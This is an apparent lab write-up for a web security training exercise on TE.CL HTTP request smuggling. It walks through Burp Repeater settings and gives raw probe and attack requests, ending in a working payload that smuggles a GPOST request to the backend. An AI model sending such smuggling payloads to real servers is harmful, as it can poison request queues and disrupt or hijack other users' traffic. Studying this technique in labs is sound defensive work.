# TE.CL Request Smuggling

After confirming the vulnerability, we can start attacking the target.

First, get the probing payload on the Repeater, and rename it to “Attack request” for convenience. Then downgrade the HTTP protocol to 1.1, untick “Update content length” option in repeater tab settings (gear symbol), move the inspector to the left and enable non printable characters.

![image.png](TE%20CL%20Request%20Smuggling/image.png)

```xml
POST / HTTP/1.1
Host: 0a0b00860494716580128fc6003d00c2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Open the 2nd tab by duplicating the legitimate request, make it similar to the probing payload — downgrade HTTP, change request method (if needed), enable non-printables.

![image.png](TE%20CL%20Request%20Smuggling/image%201.png)

---

Let’s also try to poison the request using [TE.CL](http://TE.CL) attack. Change the attack request to the following:

![image.png](TE%20CL%20Request%20Smuggling/image%202.png)

Send the attacking request, go back to normal request, send it as well, and get the error:

![image.png](TE%20CL%20Request%20Smuggling/image%203.png)

This is happening because the attacking request poisons the backend with the `G0` characters, as described on the scheme below:

![image.png](TE%20CL%20Request%20Smuggling/image%204.png)

---

### Solution

The lab requires to trigger the error “Invalid method GPOST”. For this, get the attacking request, delete the body, copy the whole request, paste it to as the body and rename the method to `GPOST`:

![image.png](TE%20CL%20Request%20Smuggling/image%205.png)

Add the terminating chunk, change Content-Length of a smuggled request to 5, because there are 5 bytes.

![image.png](TE%20CL%20Request%20Smuggling/image%206.png)

Following the chunk format:

```xml
<chunk content length in HEX, e.g. 3> <**\r\n** aka CRLF> <chunk content> <\r\n aka CRLF>
```

We need to mention the chunk content length. For this, we’ll select the chunk body, and see the length value already shown in Burp, which is 86 decimal or 0x56 hex:

![image.png](TE%20CL%20Request%20Smuggling/image%207.png)

Let’s add one more carriage line up there and fill in the chunk size:

![image.png](TE%20CL%20Request%20Smuggling/image%208.png)

Now we need to update the Content-Length of the actual message on line 4. We need to make backend think that our request ends on line 6 (`56\r\n`). Meaning our Content Length should be 4:

![image.png](TE%20CL%20Request%20Smuggling/image%209.png)

We may think this is the end, but not totally :) If we send a request like this, our smuggled request will be executed silently on the backend and we won’t receive a message on a screen. So, we will just increase the content-length of a smuggled request by 1, so that the backend will be poisoned and waiting for another request to come in. When another request will come in, its 1st byte will be appended to a poisoned request, and we will see the error message. Here’s some good explanation:

![image.png](TE%20CL%20Request%20Smuggling/image%2010.png)

Incrementing Content-Length…

![image.png](TE%20CL%20Request%20Smuggling/image%2011.png)

And also, seems like we forgot a header Transfer-Encoding, which is crucial in this exploit:

![image.png](TE%20CL%20Request%20Smuggling/image%2012.png)

DON’T FORGET TO UNTICK AUTOMATIC CONTENT LENGTH UPDATE!

![image.png](TE%20CL%20Request%20Smuggling/image%2013.png)

Now, we are finally ready to send a request and poison the backend.

```xml
POST / HTTP/1.1
Host: 0acd0010046da38b81dac0150067004b.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 4

56
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0

```

This is what happens after we send a normal request afterwards:

![image.png](TE%20CL%20Request%20Smuggling/image%2014.png)

Profit

![image.png](TE%20CL%20Request%20Smuggling/image%2015.png)